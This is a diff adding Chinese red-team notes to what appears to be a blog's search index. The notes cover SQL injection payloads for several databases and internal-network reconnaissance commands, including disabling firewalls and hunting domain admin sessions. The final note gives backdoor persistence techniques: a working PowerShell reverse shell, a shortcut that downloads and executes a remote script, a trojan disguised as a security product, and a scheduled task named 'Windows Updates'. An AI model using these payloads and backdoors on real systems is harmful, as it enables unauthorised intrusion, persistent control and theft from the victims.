@@ -149,7 +149,7 @@ site:example.com filetype:xlssite:example.com filetype:sqlsite:example.com filet
         <category>红队笔记</category>
       </categories>
       <tags>
-        <tag>GoogleHacking</tag>
+        <tag>信息收集</tag>
       </tags>
   </entry>
   <entry>
@@ -1077,6 +1077,485 @@ window.alert = function(name) &#123;    var iframe = document.createElement(&quo
       </categories>
       <tags>
         <tag>信息搜集</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入-联合查询总结</title>
+    <url>/2021/09/23/SQL%E6%B3%A8%E5%85%A5-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[联合查询注入利用的条件：页面上有显示位
+联合注入的过程：
+1、判断注入点2、判断是整型还是字符型3、判断查询列数4、判断显示位5、获取所有数据库名6、获取数据库所有表名7、获取字段名8、获取字段中的数据
+
+数据库判断：1.用@@datadir查看数据库安装目录，能否判断出2.通过各个数据库特有的数据表来判断:
+mssql:and (select count(*) from sysobjects)&gt;0 and 1=1Accese:and (select count(*) from msysobjects)&gt;0 and 1=1mysql:and (select count(*) from information_schema.TABLES)&gt;0 and 1=1 oracle:and (select count(*) from sys.user_tables)&gt;0 and 1=1
+
+终极法宝 ：报错信息！！！！！！！！！！
+mysql注入注入判断：
+&#x27;&quot;And 1=1ord(0x1)&gt; \\/#--+-^1^0
+
+字段数判断：
+Order by 3 --
+
+获取所有数据库名：
+select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA
+
+获取表名：
+Union select table_name from information_schema.tables where table_schema=database() --
+
+获取字段名：
+Union select column_name from information_schema.columns where table_schema=table_name -
+
+查询数据:
+union select 1,group_concat(concat_ws(char(32,58,32),first_name,password))  from users --
+
+内置函数：
+拆解数据库名：database() 用户名：user() 版本：version() 或 @@version数据库路径：@@datadir
+
+mysql通过information_schema这个表查询相应的数据库名，表名，字段名。
+oracle注入获取数据库所有用户：
+SELECT username FROM all_users;SELECT name FROM sys.user$; -- 需要高权限
+
+获取当前数据库用户：
+SELECT user FROM dual;
+
+字段数判断：
+order by 3 --and 1=2 union select null,null,null from dual--
+
+判断子段的数据类型：
+and 1=2 union select &#x27;null&#x27;,null,null from dual--  //返回正常，则第一个字段是字符型，返回错误，为字符型，返回错误，为字符型
+
+数据库信息：
+and 1=2 union select null,(select banner from sys.v_$version where rownum=1),null from dual--  //探测数据库版本信息
+
+查询表名：
+and 1=2 union select null,(select table_name from user_tables where rownum=1),null from dual--  //查询第一个表名and 1=2 union select null,(select table_name from user_tables where rownum=1 and table_name&lt;&gt;&#x27;STUDENT&#x27;),null from dual--  //第二个表名
+
+查询字段名：
+and 1=2 union select null,(select column_name from user_tab_columns where table_name=&#x27;[表名]&#x27; and rownum=1),null from dual-- //查看第一个字段名and 1=2 union select null,(select column_name from user_tab_columns where table_name=&#x27;[表名]&#x27; and rownum=1 and column_name&lt;&gt;&#x27;[第一个字段名]&#x27;),null from dual-- //查看第二个字段名and 1=2 union select null,(select column_name from user_tab_columns where table_name=&#x27;[表名]&#x27; and rownum=1 and column_name&lt;&gt;&#x27;[第一个字段名]&#x27; and column_name&lt;&gt;&#x27;[第二个字段名名]&#x27;),null from dual-- //查看第三个字段名
+
+查数据：
+and 1=2 union select id,name,pass from student where id=1--  //查看数据wmsys.wm_concat()等同于MySQL中的group_concat()，在11gr2和12C上已经抛弃，可以用LISTAGG()替代
+
+如果字符集不匹配：则需要进行字符集转换：
+cast(&#x27;&#x27; as nvarchar2(10))
+
+栗子：
+http://59.63.200.79:8808/?id=-1%20union%20all%20select%20NULL,NULL,cast((select%20table_name%20from%20user_tables%20where%20rownum=1)%20as%20nvarchar2(10)),1%20from%20dual--%20-
+
+注意点1.Oracle 在使用union 查询的跟Mysql不一样Mysql里面我用1,2,3,4就能占位，而在Oracle里面有比较严格的类型要求。也就是说你union select的要和前面的字段类型一样，我们可以用null来代替站位。
+2.Oracle和mysql不一样，分页中没有limit，而是使用三层查询嵌套的方式实现分页(查询第一条数据“&gt;&#x3D;0&lt;&#x3D;1”) 
+例如:
+SELECT * FROM ( SELECT A.*, ROWNUM RN FROM (select * from session_roles) A WHERE ROWNUM &lt;= 1 ) WHERE RN &gt;= 0
+
+3.Oracle的单行注释符号是–，多行注释符号&#x2F;**&#x2F;
+Acess数据注入判断字段：
+order by 1 --+-
+
+判断表：
+联合查询表，回显正常即为表存在，反之为不存在。
+Union select * from 表名   或  表名还可以使用这种方法来猜表名，and 0&lt;&gt;(select count(*) from 表名) 
+
+列名也只能靠猜，如果猜不到就只能使用偏移注入来碰运气了
+and exists (select admin from admin)and exists (select count(列名) from 表名)
+
+爆字段内容：
+爆字段内容要分两步，先猜长度，再猜内容猜长度。and (select len(admin) from admin)&#x3D;5，如果正确则回显正常。
+猜内容，一个一个字段的猜，和盲注一样的道理。and (select asc(mid(admin,1,1)) from admin)&gt;95,
+and (select top 1 asc(mid(列名,列数N,1)) from 表名) &gt; xtop后的数字为该列的第N行，x为ASCII码，列数N就是在这一列中的第几个数字asc()仍然还是转换为ascii码的函数，mid(admin,1,1)则为截取admin字段内容的第一个字符的一个字符，也就为第一个字符。
+
+MSSQL注入查询当前的用户数据信息：
+?id=1 having 1=1--+-
+
+猜表名：
+?id=1 and exists(select * from tablename)?id=1 and (Select Count(*) from [表名])&gt;0
+
+猜字段：
+?id=1 and (Select Count(字段名) from 表名)&gt;0
+
+爆当前表中的列：
+?id=1 group by admin.username having 1=1–-+-
+
+猜字段中记录长度：
+?id=1 and (select top 1 len(字段名) from 表名)&gt;0
+
+猜字段中的ascii值：
+?id=1 and (select top 1 asc(mid(字段名,1,1)) from 表名)&gt;0 access?id=1 and (select top 1 unicode(substring(字段名,1,1)) from 数据库名)&gt;0
+
+查数据：
+UNION SELECT name FROM master..syscolumns WHERE id = (SELECT id FROM master..syscolumns WHERE name = &#x27;tablename&#x27;)
+
+测试权限结构（mssql）：
+· ?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘sysadmin’));–· ?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘serveradmin’));–· ?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘setupadmin’));–· ?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘securityadmin’));–· ?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘diskadmin’));–· ?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘bulkadmin’));–· ?id=1 and 1=(SELECT IS_MEMBER(‘db_owner’));–
+
+mssql内置函数：
+· ?id=1 and (select @@version)&gt;0　　　获得Windows的版本号· ?id=1 and user_name()=’dbo’　　　　 判断当前系统的连接用户是不是sa· ?id=1 and (select user_name())&gt;0　　爆当前系统的连接用户· ?id=1 and (select db_name())&gt;0　　　得到当前连接的数据库]]></content>
+      <categories>
+        <category>红队笔记</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>内网渗透-信息收集</title>
+    <url>/2021/09/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
+    <content><![CDATA[
+前言：内网渗透的本质，是信息收集！信息收集这一环节其实贯穿了整个内网渗透！
+
+01-立足点：Foothold，就是我们拿到内网中一台主机权限，作为内网渗透的突破口，我们所有的操作，包括流量转发，端口扫描，漏扫等操作，都会利用此主机为我们搭桥铺路，为以后的内网横向打下坚实的基础。
+02-立足点的信息收集立足点信息收集包括：OS、权限、内网IP段、杀软、端口、服务、补丁更新频率、网络连接、共享、会话等
+
+注：如果是域内主机，OS、应用软件、补丁、服务、杀软这些一般都是批量安装的。
+
+前方干货来袭,注意注意！
+1.查询网络配置命令：Windows:ipconfig /allLinux:    ifconfig /allcat /etc/resolv.confcat /etc/sysconfig/networkcat /etc/networks
+
+2.查询操作系统及软件的信息1）查看操作系统和版本信息
+windows:systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;//适用于英文的操作系统，中文的：systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;&#x27;    Linux:    查看服务器版本信息：Cat /etc/issueCat /etc/*-releaseCat /etc/lsb-release #基于debianCat /etc/radhat-release #基于redhat查看内核版本信息：Cat /proc/vesionUname -aUname -mrsRpm -q kernelDmesg | grep linuxLs /boot | grep vmlinuz-
+
+2）查看系统体系结构
+windows:echo %PROCESSOR_ARCHITECTURE%    Linux:    uname -adpkg --print-architecture   //此命令只适用于基于Debian和Ubuntu的Linux发行版。        getconf LONG_BITarchfile /sbin/init        查看安装的软件及版本、路径等windows:wmic product get name,versionPowershell版本：powershell.exe &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,Version    Linux:    Ls -alh /usr/bin/Ls -alh /sbin/Dpkg -lRpm -qaLs -alh /var/cache/apt/archivesOLs -alh /var/cache/yum/
+
+3.查询本机服务信息windows:wmic service list briefLinux:   service --status-allchkconfig --listps aux进入init.d目录查看netstat -lntpntsysv
+
+4.查询进程列表windows:           tasklist//或者wmic process list brief    Linux:    ps aux   常见杀毒软件进程：                   360sd.exe                     360tray.exe                    ZhuDongFangYu.exe                    KSafeTray.exe                    SafeDogUpdateCenter.exe                    McAfee McShield.exe                    egui.exe //NOD32                     AVP.EXE  //卡巴斯基                    avguard.exe    //小红伞                    bdagent.exe    //BitDefender
+
+5.查看启动程序信息windows:wmic startup get command,caption     Linux:    PSps aux | less  toppstreehtopatop
+
+6.查看计划任务windows:schtasks /query /fo LIST /v   Linux:    crontab -l
+
+7.查看主机开机时间windows:net statistics workstation   Linux:last  reboot //查看历史启动时间W//系统到目前运行了多久时间。反过来推算系统重启时间uptimeTOP//up后表示系统到目前运行了多久时间。反过来推算时间who -b 查看最后一次系统启动的时间。who -r 查看当前系统运行时间
+
+8.查询用户列表windows:net usernet localgroup adinistrators//获取本地管理员组成员query user || qwinsta//查看当前再线用户   Linux:    cat /etc/passwdcat /etc/group延申：cat /etc/passwd|grep -v nologin|grep -v halt|grep -v shutdown|awk -F&quot;:&quot;&#x27;&#123; print $1&quot;|&quot;$3&quot;|&quot;$4 &#125;&#x27;|more
+
+9.列出或断开本地计算机与所连接的客户端之间的会话windows:net session   Linux:    who -a
+
+10.查询端口列表netstat -ano
+
+11.查询补丁列表windows:systeminfo//查找提权补丁信息systeminfo&gt;C:\Temp&gt;micropoor.txt&amp;(for %i in ( KB977165 KB2160329 KB2503665 KB2592799KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904KB3134228 KB3143141 KB3141780 ) do @type micropoor.txt|@find /i&quot;%i&quot;|| @echo %i you can fuck)&amp;del /f /q /a micropoor.txt        //里面可以任意添加删除补丁编号Linux:  linux需要查看内核版本信息，查看安装的软件包，然后进行对比
+
+12.查询本机共享列表windows:net share//wmic:wmic share get name,path,statusLinux:在/mnt/hgfs目录下查看
+
+13.查询路由表及所有可用接口的ARP缓存表windows:route printarp -a  Linux:arp –aRoute/sbin/route -nee
+
+14.查询防火墙相关配置1）关闭防火墙
+windows:  //windows server 2003之前netsh firewall set opmode disable                                  //Windows server 2003之后netsh advfirewall set allprofile state off  Linux:    //暂时关闭防火墙systemctl stop firewalldservice iptables stop//永久关闭防火墙systemctl disable firewalldchkconfig iptables  off
+
+2）查看防火墙配置
+windows:netsh firewall show config Linux:   Iptables-save &gt;ipt.txt
+
+
+修改防火墙配置
+
+windows://windows server 2003之前允许指定程序全部连接netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable//windows server 2003之后的版本netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;c:\nc.exe&quot;//允许指定程序退出netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C:\nc.exe&quot;//允许3389端口放行netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow linux：   //查看防火墙状态systemctl status firewalld//启动防火墙systemctl start firewalld.service//开放TCP的80端口，并重载防火墙firewall-cmd --zone=public --add-port=80/tcp --permanent//重载防火墙 firewall-cmd --reload//查看防火墙开放端口firewall-cmd --zone=public --list-ports
+
+4)自定义防火墙日志的存储位置
+windows:netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;Linux:  参考文章https://blog.csdn.net/xiexievv/article/details/48001261
+
+15.查看代理配置情况windows:reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;   Linux:    source /etc/profile
+
+16.查询并开启远程连接服务1）查看远程连接端口
+reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber
+
+2)在Windows server 2003中开启3389
+wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1
+
+3)在Windows server 2008和2012中
+wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1//修改注册表方式reg query &quot;HKLM\System\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
+
+17.自动收集信息Empire下的主机信息收集，输出到格式为html文件使用模块：
+usemodule situational_awareness/host/winenumexecute
+
+18.查询当前权限windows:whoami /all//查询指定用户的详细信息net user xxx /domain  Linux:    idwhoami
+
+03-域内的信息收集1.判断是否存在域查看dns服务器ipconfig /allnslookup dc.test.local//将查看到的DNS服务器用nslookup进行解析        查看系统详细信息systeminfo | findstr /B /C:&quot;登录服务器&quot;//如果结果不为&quot;WORKGROUP&quot;则主机为域主机                      //查询当前登录域及登录用户信息net group workstation                     //判断主域net time /domain//命令用于查看域内时间，同时也可以查看域控制器
+
+2. 探测域内存活主机使用nbtscan(http://www.unixwiz.net/tools/nbtscan.html)探测当前网段主机nbt.exe 192.168.2.0/20        使用ICMP探测for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.2.%I | findstr &quot;TTL=&quot;        通过ARPscan工具扫描探测内网arp.exe -t 192.168.2.0/20        Empire中的ARPscan模块usemode situational_awareness/network/arpscanexecuteNishang中的Invoke-ARPScan.ps1 powershell.exe -exec bypass -Command &quot;&amp; (Import-module c:\windows\temp\Invoke-ARPscan.ps1; Invoke-ARPScan -CIDR 192.168.1.0/20)&quot; &gt;&gt; c:\windows\temp\log.txttype c:\windows\temp\log.txt        通过常规的TCP/UDP端口扫描探测内网上传ScanLine进行扫描：scanline -h -t 22,80-90,110,445 -u 53,161 -O c:\windows\temp\log.txt -p 192.168.1.1-254 /b
+
+3.扫描域内端口telnet(但是这个速度太慢了点)Metasploit端口扫描:auxiliary/scanner/portscan/tcpset ports 1-1000set RHOST 192.168.1.1set THREADS 10run        PowerSploit、NiShang的Invoke-portscan脚本注：msf记得添加路由或代理autoroute添加路由run autoroute –h #查看帮助run autoroute -s 192.168.159.0/24  #添加到目标环境网络run autoroute –p  #查看添加的路由                      当然msf不止有扫描端口的脚本，这里在列举几个其他脚本： 1. use auxiliary/scanner/http/dir_scanner 2. use auxiliary/scanner/http/jboss_vulnscan 3. use auxiliary/scanner/mssql/mssql_login 4. use auxiliary/scanner/mysql/mysql_version 5. use auxiliary/scanner/oracle/oracle_login//扫描的脚本位于：/usr/share/metasploit-framework/modules/auxiliary/scanner/
+
+4. 收集域内基础信息net view /domain//查询域net view /domain:test//查询域内所有计算机net group /domain//查询域内所有用户组列表 net group &quot;domain computers&quot; /domain//查询所有域成员计算机列表net accounts /domain//获取域内密码信息nltest /domain_trusts//域内信任信息
+
+5. 查找域控nltest /DCLIST:testnet time /domain  Nslookup -type=SRV _ldap._tcp  net group &quot;Domain Controllers&quot; /domain  netdom query pdc//查看主控制器
+
+6. 获取域内的用户和管理员信息//查询所有域用户列表net user /domain //获取域内用户的详细信息wmic useraccount get /all //查看存在的用户,但是这个只能在域控或者安装了对应服务的主机使用，否则会提示命令不存在dsquery user //查找目录中的计算机dsquery computer //查询本地管理员组用户net localgroup administrators //查询域管理员用户组net group &quot;domain admins&quot; /domain //查询管理员用户组net group &quot;Enterprise Admins&quot; /domain
+
+7. 定位域管理员在获取了Windows域中的普通权限在进行横向渗透时，需要知道域内用户登录的位置，是否是任何系统&#x2F;主机的本地管理员，以及所属组等关键信息。 这里直接用前辈们造的轮子吧，能够使用的轮子有：psloggedon.exe、PVEFindADUser.exe、netness.exe、hunter、NetView、PowerView。
+psloggedon.exe//能够通过此工具查看远程计算机的资源，也就是说能够查看目标主机有哪些账户在登录状态        下载地址：https://docs.microsoft.com/zh-cn/sysinternals/downloads/psloggedon使用：psloggedon.exe \\dc2012  PVEFindADUser//PVEFindADUser能够用于查找活动目录用户登录的位置，枚举与用户，以及查找在特定计算机上登录的用户。包括本地用户、通过RDP登录的用户、用于运行服务和计划任务的用户。（这个工具需要.NET 3.5）Windows Server 2012安装.NET 3.5可能不成功，需要指定安装源：https://www.cr173.com/soft/921507.html下载地址：https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOnPVEFindADUser.exe -current        NetView//NetView是一个枚举工具，使用WinAPI枚举系统，利用NetSessionEnum找寻登陆会话，利用NetShareEnum找寻共享，利用NetWkstaUserEnum枚举登录的用户。同时还能够查询共享入口和有价值的用户。下载地址：https://github.com/mubix/netview           PowerView使用Powerview的Invoke-UserHunter。            Empire//Empire中也存在此类型的脚本：usemodule situational_awareness/network/powerview/user_hunterexecute            Nmap的NSE脚本//通过Nmap的NSE脚本获取远程机器的登陆会话。smb-enum-sessions.nse获取域内主机的用户登录会话，查看当前是否有用户登录。下载地址：https://nmap.org/nsedoc/scripts/smb-enum-sessions.htmlsmb-enum-domains.nse对域控制器进行信息收集，可以获取主机信息用户、可使用密码策略的用户等。smb-enum-users.nse可以使用此脚本对域控进行扫描。
+
+8. 查找域管理进程
+参考文章：https://yq.aliyun.com/articles/599377?type=2
+
+本机检查：//获取域管理员列表net group &quot;Domain Admins&quot; /domain//列出本机的所有进程和进程用户tasklist /v//查询域控的域用户会话//查询域控列表net group &quot;Domain Controllers&quot; /domain//收集所有活动域的会话列表netsess -h
+
+9. 补充一点linux信息收集姿势常见的配置文件有那些？有没有可攻击的插件：
+Cat /etc/syslog.confCat /etc/chttp.confCat /etc/lighttpd.confCat /etc/cups/cupsd.confCat /etc/inetd.confCat /etc/apache2/apache2.confCat /etc/my.confCat /etc/http/conf/http.confCat /opt/lampp/etc/httpd.confLs -aRl /etc/ | awk &#x27;$1 ~ /^.r./
+
+查找系统内跟用户名和密码的有关的文件
+Grep -I user [filename]grep -i pass [filename] grep -C 5 “password” [filename] find . -name “*.php” -print0 | xargs     -0 grep -i -n “var $password” # Joomla]]></content>
+      <categories>
+        <category>红队笔记</category>
+      </categories>
+      <tags>
+        <tag>信息收集</tag>
+        <tag>内网渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>内网基础-定位域管理员</title>
+    <url>/2021/03/18/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/</url>
+    <content><![CDATA[前言：在域渗透中，需要对有目的性的渗透，快速控制一个域最快的办法（不包括直接利用提升为域管的漏洞）就是拿到域管理员的hash，然后对域控进行dcsync，拿到域内所有成员的hash，那么我们如何定位域管理员在哪台机器上登录过？
+当然窃取凭据域管理员进程也是一个不错的选择！
+1.通过net group “domain admins” &#x2F;domain 列出域管理员组成员
+2.通过tasklist &#x2F;v 列出本地进程的所有者
+3.进行交叉处理，找到域管理进程
+通过域搭建的原理来看，在机器加入域之后，域管理员组成员会自动加入到本地的管理员组。
+定位域管理员的常规渠道：
+1.日志（本地管理员日志）
+2.会话（域内每台机器的登陆回话）
+常用工具psloggedon.exe这是微软的自带的pstool工具包的一个非常实用的工具，其原理为检查注册表HKey_USER项的key来查询，会调用NetSession api,所以有些功能需要管理员权限。
+命令：
+psloggedon 要列出登陆信息的机器名或者用户名#如果没有填 则默认为本地如果指定用户名，则会搜索次用户登陆过哪些机器
+
+
+
+
+描述
+
+
+
+
+-
+显示支持的选项和用于输出值的度量单位
+
+
+-l
+仅显示本地登录，而不显示本地和网络资源登录
+
+
+-x
+不显示登录时间
+
+
+\computername
+指定要为其列出登录信息的计算机的名称
+
+
+username
+指定用户名，在网络中搜索该用户登陆的计算机
+
+
+配合net localgroup administrators 找到域管登陆过的机器
+PVEFindaduser.exe用于查找AD用户的登录位置、枚举域用户，以及查找在特定计算机上登陆的用户，包括本地用户、通过RDP登陆的用户、用于运行服务和计划任务的用户。
+命令：
+PVEFindADUser.exe -current#将获取域内所有计算机上当前登陆的所有用户结果保存到report.csv文件
+
+
+
+
+参数
+描述
+
+
+
+-last
+将获取目标计算机的最后一个登陆用户
+
+
+-target
+指定要查询的计算机
+
+
+-current [“username”]
+-current参数显示每台PC上当前登录的用户在域中。如果指定用户名（在引号之间），则仅将显示该特定用户登录的PC
+
+
+-noping
+阻止尝试枚举用户登录名之前对目标计算机执行ping命令
+
+
+netview.exenetview.exe是一个枚举工具，使用WinAPI枚举系统，利用NetSessionEnum找寻登录会话，利用NetShareEnum找寻共享，利用NetWkstaUserEnum枚举登录的用户，netview.exe还可以查询共享入口和有价值的用户。
+netview.exe &lt;参数&gt;
+
+
+
+
+-h
+显示帮助信息
+
+
+
+-f
+filename.txt:指定要提取主机列表的文件
+
+
+-e
+filename.txt:指定要排除的主机名的文件
+
+
+-o
+filename.txt:将所有输出重定向到指定的文件
+
+
+-d
+filename.txt:指定要提取主机列表的域。如果没有指定，则从当前域中提取主机列表
+
+
+-g
+group:指定搜索的组名。如果没有指定，则在Domain Admins组中搜索
+
+
+-c
+对已找到的共享目录&#x2F;文件的访问权限进行检查
+
+
+nmap 脚本可以使用nmap的smb-enum-sessions.nse引擎获取远程主机的登陆会话（不需要管理员权限）
+其他域渗透脚本smb-enum-domains.nse:对域控制器进行信息收集，可以获取主机信息、用户、可使用密码策略的用户等
+smb-enum-users.nse:在进行域渗透时，如获取了域内某台主机权限，但权限有限，无法获取更多的域用户信息，可借助此脚本对域控制器进行扫描
+smb-enum-shares.nse:遍历远程主机的共享目录
+smb-enum-processes.nse:对主机的系统进程进行遍历，通过此信息，可知道目标主机运行着哪些软件
+smb-enum-sessions.nse:获取域内主机的用户登陆会话，查看当前是否有用户登陆
+smb-enum-discovery.nse:收集目标主机的操作系统、计算机名、域名、域林名称、NetBIOS机器名、NetBIOS域名、工作组、系统时间等信息
+Powerview脚本主要涉及到定位关键用户的功能如下两个模块
+
+Invoke-StealthUserHunter:只需要进行一次查询，就可以获取域里面的所有用户，使用方法为，从user.HomeDirectories中提取所有用户，并对没太服务器进行Get-NetSession获取。因不需要使用Invoke-UserHunter对没太机器进行操作，所以这个方法的隐蔽性相对较高（但涉及的机器不一定全面）。PowerView默认使用Invoke-StealthUserHunter如果找不到需要的信息，就使用Invoke-UserHunter
+Invoke-UserHunter:找到域内特定的用户群，接受用户名、用户了表和域组查询，接收一个主机列表或查询可用的主机域名。可以使用Get-NetSession和Get-NetLoggedon(调用NetSessionEnum和NetWkstaUserEnumAPI)扫描每台服务器并对扫描结果进行比较，从而找出目标用户集，在使用时不需要管理员权限，在本地执行该脚本
+
+Empire 模块Empire 模块中也有功能和invoke-userhunter一样的模块，user_hunter，Empire我平时也不咋用，还得反弹shell到Empire属实有点麻烦，了解了解就行。
+实际的域里面，大规模的枚举是会惊动ids等防护设备的
+介绍完工具再来说说手动：
+手工配合Netsess筛选数据首先收集域控列表：
+net group “Domain Controllers” /domainNslookup –type=SRV _ldap._tcp。。。。。。。。
+
+收集域管列表
+net group “Domain Admins” /domain
+
+通过Netsess.exe查询每个域控制器，收集所有活动域会话的列表
+Netsess.exe -help #获取帮助
+
+-full Full session info (requires admin)
+-h servername  Alternate method to specify server
+-u username    Username to filter for
+-c client name Alternate method to specify client name
+
+cmd联合命令：
+FOR /F %i in (dc.txt) do @echo [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;nul &gt; sessions.txt &amp;&amp; FOR /F %a in (domain_admins.txt) DO @type sessions.txt | @findstr /I %a
+
+Dc.txt为收集的域控制器列表，domain_admins.txt为收集的域管列表
+Get-NetLocalGroupMember 枚举远程计算机本地组安装Recon模块
+Set-ExecutionPolicy -ExecutionPolicy Bypassimport-module .\Recon.psd1
+
+指定远程计算机，指定枚举管理员组
+Get-NetLocalGroupMember -ComputerName 主机名 -GroupName administrators 
+]]></content>
+      <categories>
+        <category>红队笔记</category>
+      </categories>
+      <tags>
+        <tag>内网渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>持久性技巧</title>
+    <url>/2021/09/30/%E6%8C%81%E4%B9%85%E6%80%A7%E6%8A%80%E5%B7%A7/</url>
+    <content><![CDATA[
+“今天，我将介绍关于hacker拿到一台服务器之后，如何建立持久性的后门的一些非常实用的小技巧！”
+
+前言能留后门的工具很多，技术方法也很多，但是今天我将介绍一些简单并且异常实用的方法。
+1.快捷链接方式对，你想的没错，我们就是创建一个快捷方式，里面的链接替换上我们的有效载荷，欺骗管理员点击，运行我们的shell和执行代码。
+用社会工程学的角度来提高我们方法的可行性的几点：1.替换的快捷图标可以改成一些常用的软件，但不仅限于软件，提高管理员点击的可能性。2.改好的快捷方式可以放在比较显眼的地方，进一步提高可能性。3.最好不要用一些没用过或者安装过软件或者其他东西的快捷链接，这可能会引起怀疑。4.可以查看一波常用软件实用频率记录，比如可以从360软件管家这些第三方软考，也可直接查看控制面板中的程序实用频率。
+演示：我们创建一个安全狗快捷链接：这里我用我的windows7虚拟机创建安全狗的快捷链接尝试实用cmd.exe起powershell执行反弹shell。这里我直接用python起个简单的http服务
+$client = New-Object System.Net.Sockets.TCPClient(&quot;192.168.73.136&quot;,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;# &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()
+
+把上述代码另存为shell.ps1点开快捷链接属性，替换target为：
+cmd /c “powershell IEX (New-Object Net.WebClient).DownloadString(\&quot;http://192.168.73.136/shell.ps1\&quot;);”
+
+再把快捷链接图标换了，然后一个后门快捷方式就做好了
+
+**弊端：**但是这种方式有个很严重的弊端，就是执行了cmd 窗口会弹出来，这就很狗带，期间我也想过如何把这个玩意关掉，但是从理论上感觉不太行，各位师傅可以自行研究一番，我可能太菜了，没玩明白！结束cmd进程，相应的shell也会死掉，期间想过各种方式，方法，但都没用，这是一个很烧脑的东西！
+
+优化：我们完全可以用木马可执行文件来替换cmd执行powershell，这样后台将不会有任何操作显示，这样隐蔽一点，只需要把木马可执行文件绝对路径替换成链接的target就行了，这里仅提供一个思路，后续研究各位请继续。
+你以为这就结束了？不，还能玩玩。
+进一步优化：前面虽然执行了木马文件，但是真正链接的程序我们并没用执行，而是被替换掉了，这样就会让人引起怀疑，就会猜测是不是路径错了，一打开快捷方式属性，然后就露馅了嘛，所以我又自己瞎倒腾！
+首先建立一个bat文件，文件内容为：
+@start C:\\Users\\hacker\\Desktop\\msf.exe//启动恶意程序@&quot;C:\\Program Files (x86)\SafeDog\SafeDogSiteApache\SafeDogSiteApache.exe&quot; //启动正常程序
+
+然后快捷方式链接换成这个bat文件的链接，这样将会即执行了反弹shell，又会执行正常程序，能有效降低管理员的怀疑。
+
+但是最后还是会有个cmd框，难受，但是没显示出执行的命令，还是有点优化效果的！
+2. 计划任务方式计划任务是一个很棒的后门方法，因为根本不需要用户交互，不需要高的权限，普通用户也可以写，是一款易于使用的方法。
+这里我设置了定时任务，命令：
+schtasks  /create  /tn  testschtask /tr C:/Users/hacker/Desktop/msf.exe   /sc  DAILY /st  15:33:00
+
+当然你完全可以设置一分钟就执行一次，例如这里我创建了一个windows updates任务，每分钟执行一次，你只需要把PATH替换成你的恶意程序路径就行了，命令：
+schtasks /create /sc minute /mo 1 /tn &quot;Windows Updates&quot; /tr &quot;PATH&quot; 
+
+
+这样是非常nice的，是非常隐蔽实用的，你只需要在哪里监听，就会获得甜美的shell。
+3. Powershell配置文件：PowerShell配置文件是一个PowerShell脚本，您可以对其进行自定义，并将其特定于会话的元素添加到您启动的每个PowerShell会话中。它是一个在PowerShell启动时运行的脚本，你可以使用配置文件作为登录脚本来自定义环境，你可以添加命令，功能，别名，模块等。此外PowerShell支持多个配置文件，PowerShell主机程序可以支持其自己的主机特定配置文件。
+一些样例：
+
+
+
+Description
+Path
+
+
+
+All Users, All Hosts
+$PSHOME\Profile.ps1
+
+
+All Users, Current Host
+$PSHOME\Microsoft.PowerShell_profile.ps1
+
+
+Current User, All Hosts
+$Home\[My ]Documents\PowerShell\Profile.ps1
+
+
+Current user, Current Host
+$Home\[My ]Documents\PowerShellMicrosoft.PowerShell_profile.ps1
+
+
+PowerShell配置文件脚本存储在文件夹“ WindowsPowerShel”中，默认情况下对用户隐藏。如果有效负载已放入磁盘，则可以使用。
+cmdlet指向可执行文件的位置，命令：
+start-Process
+
+确定当前用户的配置文件是否存在，命令：
+test-Path $ profile
+
+如果配置文件不存在，将为当前用户创建一个配置文件，命令：
+new-Item -Path $ Profile -Type File -Force
+
+重写该配置文件
+out-File
+
+演示：
+
+这样我每打开一个新的powershell窗口，将会执行恶意程序！
+
+演示所用的命令：
